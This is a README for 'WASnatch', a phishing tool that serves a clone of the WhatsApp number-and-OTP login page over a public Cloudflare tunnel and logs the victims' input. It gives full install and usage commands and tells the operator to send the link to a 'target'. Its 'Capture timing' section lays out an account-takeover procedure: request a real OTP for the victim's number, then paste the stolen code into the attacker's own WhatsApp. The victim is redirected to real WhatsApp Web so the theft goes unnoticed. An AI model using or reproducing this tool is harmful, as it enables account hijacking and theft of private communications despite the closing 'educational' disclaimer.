# WASnatch

A WhatsApp login phishing page with an automatic Cloudflare tunnel and live
terminal capture.

WASnatch serves a mobile-first clone of the WhatsApp phone-number / OTP login
flow, exposes it over a public `trycloudflare.com` HTTPS link, and prints every
captured number and verification code to your terminal in real time.

Runs on **Windows 10/11 CMD (no WSL)**, **Termux**, **Kali Linux**, and **macOS**.

---

## Features

- Convincing two-step WhatsApp flow: phone number, then 6-digit code
- Automatic `cloudflared` quick tunnel with a real HTTPS link
- Live terminal capture with bell alert, timestamps, IP and user agent
- All captures appended to `captures.log`
- Auto-submit when six digits are entered, resend countdown, spinner states
- Victim is redirected to real `web.whatsapp.com` after verification
- Zero framework dependencies, standard library only
- Single file, no configuration files, no build step

---

## Requirements

- Python 3.8 or newer
- An internet connection for the Cloudflare tunnel
- `cloudflared` (auto-downloaded on first run, or installed manually)

`colorama` is optional and only improves colours on old Windows consoles.

---

## Installation

### Termux (Android)

```bash
pkg update -y && pkg upgrade -y
pkg install -y python git
pkg install -y cloudflared        # optional, recommended on Termux
termux-wake-lock
git clone <your-repo-url> wasnatch
cd wasnatch
pip install -r requirements.txt
python main.py
```

If `pkg install cloudflared` is unavailable on your mirror, skip it — the tool
downloads the official arm64 binary automatically.

### Kali Linux / Debian / Ubuntu

```bash
sudo apt update
sudo apt install -y python3 python3-pip curl git
git clone <your-repo-url> wasnatch
cd wasnatch
pip3 install -r requirements.txt --break-system-packages
python3 main.py
```

### Windows 10 / 11 (CMD, no WSL)

1. Install Python from <https://www.python.org/downloads/windows/> and tick
   **Add python.exe to PATH** during setup.
2. Open **Command Prompt** and run:

```bat
git clone <your-repo-url> wasnatch
cd wasnatch
py -m pip install -r requirements.txt
py main.py
```

If Windows Firewall prompts, choose **Allow access**.

No WSL, no bash, no Docker required.

### macOS

```bash
brew install python3
git clone <your-repo-url> wasnatch
cd wasnatch
pip3 install -r requirements.txt
python3 main.py
```

---

## Usage

```bash
python3 main.py
```

The tool prints a public link:

```
==============================================================
   SEND THIS LINK TO THE TARGET
==============================================================
   https://random-words-here.trycloudflare.com
==============================================================
```

Send that link to the target. Keep the terminal open.

### Options

| Flag | Description |
| --- | --- |
| `-p`, `--port` | Local port (default `8080`, auto-bumps if busy) |
| `--no-tunnel` | LAN only, skips cloudflared |
| `--redirect` | URL shown after capture (default `https://web.whatsapp.com`) |

Example:

```bash
python3 main.py -p 9090 --redirect https://web.whatsapp.com
```

---

## How it works

1. A local HTTP server serves the fake WhatsApp page.
2. `cloudflared` opens a quick tunnel and returns a public HTTPS URL.
3. The victim opens the link and sees a phone-number screen.
4. On submit, the number is printed to your terminal and logged.
5. The victim sees the code screen and waits for the real OTP from WhatsApp.
6. On submit, the code is printed to your terminal and logged.
7. The victim is redirected to real WhatsApp Web — no error, no dead end.

### Capture timing (important)

WhatsApp OTPs expire quickly, so the correct order is:

1. Send the link.
2. Wait for the number to appear in your terminal.
3. Open WhatsApp on **your** device and enter that number, tap **Send code**.
4. The real OTP reaches the victim's phone; they type it into your page.
5. Paste the captured code into your own WhatsApp immediately.

---

## Output

```
==============================================================
   [+] PHONE NUMBER CAPTURED
==============================================================
   NUMBER : +92 3001234567
   IP     : 103.255.x.x
   AGENT  : Mozilla/5.0 (Linux; Android 13; SM-A525F) ...
   TIME   : 21:14:07
==============================================================

==============================================================
   [*] OTP CODE CAPTURED
==============================================================
   NUMBER : +92 3001234567
   CODE   : 418302
   IP     : 103.255.x.x
   TIME   : 21:14:51
==============================================================
```

---

## Files

| File | Purpose |
| --- | --- |
| `main.py` | Whole tool: server, pages, tunnel, capture |
| `requirements.txt` | Optional dependency |
| `LICENSE` | MIT licence |
| `captures.log` | Created at runtime, one line per capture |
| `bin/` | Created at runtime, holds the cloudflared binary |

---

## Troubleshooting

**Tunnel does not start**
Run `cloudflared --version`. If missing, install it with your package manager
(`pkg install cloudflared`, `sudo apt install cloudflared`, or
`winget install Cloudflare.cloudflared`). The tool also accepts the
`CLOUDFLARED` environment variable pointing at a binary.

**Port already in use**
Pass another port: `python3 main.py -p 9090`.

**Termux kills the process in the background**
Run `termux-wake-lock` and keep Termux in the foreground.

**No colours on Windows CMD**
`pip install colorama`, or use Windows Terminal.

**Page loads but link does not work**
Quick tunnels are ephemeral. Restarting the tool produces a new link — always
send the freshest one.

---

## Disclaimer

WASnatch is an educational tool. It captures numbers and codes but does not
maintain a persistent session; it is meant for authorised testing and for
capturing your own or a consenting target's login.
